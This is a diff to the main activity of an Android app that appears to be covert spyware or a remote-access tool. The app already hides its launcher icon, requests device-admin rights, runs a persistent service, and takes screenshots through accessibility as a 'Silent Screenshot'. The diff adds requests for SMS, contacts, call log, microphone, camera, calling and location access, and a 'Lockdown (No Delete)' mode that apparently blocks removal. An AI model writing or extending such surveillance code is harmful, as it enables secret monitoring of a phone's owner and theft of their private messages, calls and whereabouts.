@@ -51,6 +51,9 @@ class MainActivity : ComponentActivity() {
     private var isGalleryGranted by mutableStateOf(false)
     private var isAccessibilityEnabled by mutableStateOf(false)
     private var isIconHidden by mutableStateOf(false)
+    private var isFullPermissionsGranted by mutableStateOf(false)
+    private var isLocationGranted by mutableStateOf(false)
+    private var isLockModeEnabled by mutableStateOf(false)
 
     private val projectionLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
         if (result.resultCode == RESULT_OK && result.data != null) {
@@ -66,7 +69,10 @@ class MainActivity : ComponentActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        Log.d("MainActivity", "onCreate called")
+        
+        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+        isLockModeEnabled = prefs.getBoolean("LOCK_MODE", false)
+
         devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         adminComponent = ComponentName(this, MyAdminReceiver::class.java)
 
@@ -83,6 +89,9 @@ class MainActivity : ComponentActivity() {
                         isGalleryGranted = isGalleryGranted,
                         isAccessibilityEnabled = isAccessibilityEnabled,
                         isIconHidden = isIconHidden,
+                        isFullPermissionsGranted = isFullPermissionsGranted,
+                        isLocationGranted = isLocationGranted,
+                        isLockModeEnabled = isLockModeEnabled,
                         onEnableAdmin = { enableDeviceAdmin() },
                         onHideIcon = { setIconVisibility(false) },
                         onShowIcon = { setIconVisibility(true) },
@@ -91,7 +100,14 @@ class MainActivity : ComponentActivity() {
                         onStartPersistentService = { startPersistentService() },
                         onSetupRemote = { startScreenCapture() },
                         onGrantGallery = { requestGalleryPermission() },
-                        onOpenAccessibility = { openAccessibilitySettings() }
+                        onOpenAccessibility = { openAccessibilitySettings() },
+                        onGrantFullPermissions = { requestFullPermissions() },
+                        onGrantLocation = { requestLocationPermission() },
+                        onToggleLockMode = { 
+                            isLockModeEnabled = !isLockModeEnabled
+                            getSharedPreferences("AppPrefs", Context.MODE_PRIVATE).edit().putBoolean("LOCK_MODE", isLockModeEnabled).apply()
+                            Toast.makeText(this, if(isLockModeEnabled) "Lockdown Active!" else "Lockdown Disabled", Toast.LENGTH_SHORT).show()
+                        }
                     )
                 }
             }
@@ -121,6 +137,21 @@ class MainActivity : ComponentActivity() {
         val pkg = packageManager
         val launcherComponent = ComponentName(this, "com.example.myapplication.LauncherActivity")
         isIconHidden = pkg.getComponentEnabledSetting(launcherComponent) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+
+        val fullPerms = arrayOf(
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.READ_CALL_LOG,
+            android.Manifest.permission.RECORD_AUDIO,
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.CALL_PHONE,
+            android.Manifest.permission.READ_PHONE_STATE
+        )
+        isFullPermissionsGranted = fullPerms.all { 
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED 
+        }
+
+        isLocationGranted = ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
     }
 
     private fun isAccessibilityServiceEnabled(context: Context, service: Class<*>): Boolean {
@@ -143,8 +174,12 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun startPersistentService() {
-        val intent = Intent(this, PersistentService::class.java)
-        startForegroundService(intent)
+        try {
+            val intent = Intent(this, PersistentService::class.java)
+            startForegroundService(intent)
+        } catch (e: Exception) {
+            Log.e("MainActivity", "FGS Start Failed: ${e.message}")
+        }
     }
 
     private fun requestGalleryPermission() {
@@ -159,6 +194,27 @@ class MainActivity : ComponentActivity() {
     private fun openAccessibilitySettings() {
         val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
         startActivity(intent)
+    }
+
+    private fun requestFullPermissions() {
+        val permissions = arrayOf(
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.READ_CALL_LOG,
+            android.Manifest.permission.RECORD_AUDIO,
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.CALL_PHONE,
+            android.Manifest.permission.READ_PHONE_STATE
+        )
+        requestPermissions(permissions, 1002)
+    }
+
+    private fun requestLocationPermission() {
+        val permissions = arrayOf(
+            android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION
+        )
+        requestPermissions(permissions, 1003)
     }
 
     private fun enableDeviceAdmin() {
@@ -210,6 +266,9 @@ fun ControlPanel(
     isGalleryGranted: Boolean,
     isAccessibilityEnabled: Boolean,
     isIconHidden: Boolean,
+    isFullPermissionsGranted: Boolean,
+    isLocationGranted: Boolean,
+    isLockModeEnabled: Boolean,
     onEnableAdmin: () -> Unit,
     onHideIcon: () -> Unit,
     onShowIcon: () -> Unit,
@@ -218,7 +277,10 @@ fun ControlPanel(
     onStartPersistentService: () -> Unit,
     onSetupRemote: () -> Unit,
     onGrantGallery: () -> Unit,
-    onOpenAccessibility: () -> Unit
+    onOpenAccessibility: () -> Unit,
+    onGrantFullPermissions: () -> Unit,
+    onGrantLocation: () -> Unit,
+    onToggleLockMode: () -> Unit
 ) {
     val activeColor = Color(0xFF4CAF50) // Green
     val inactiveColor = Color(0xFF2196F3) // Blue
@@ -274,6 +336,33 @@ fun ControlPanel(
             Text("Enable Accessibility (Silent Screenshot)")
         }
         
+        Spacer(modifier = Modifier.height(10.dp))
+
+        Button(
+            onClick = onGrantFullPermissions,
+            colors = ButtonDefaults.buttonColors(containerColor = if (isFullPermissionsGranted) activeColor else inactiveColor)
+        ) {
+            Text("Grant Call/SMS/Audio/Cam Permissions")
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+
+        Button(
+            onClick = onGrantLocation,
+            colors = ButtonDefaults.buttonColors(containerColor = if (isLocationGranted) activeColor else inactiveColor)
+        ) {
+            Text("Grant Location Permission")
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        
+        Button(
+            onClick = onToggleLockMode,
+            colors = ButtonDefaults.buttonColors(containerColor = if (isLockModeEnabled) Color.Red else Color(0xFF9C27B0))
+        ) {
+            Text(if (isLockModeEnabled) "Disable Lockdown (No Delete ON)" else "Enable Lockdown (No Delete OFF)")
+        }
+
         Spacer(modifier = Modifier.height(10.dp))
         
         Button(
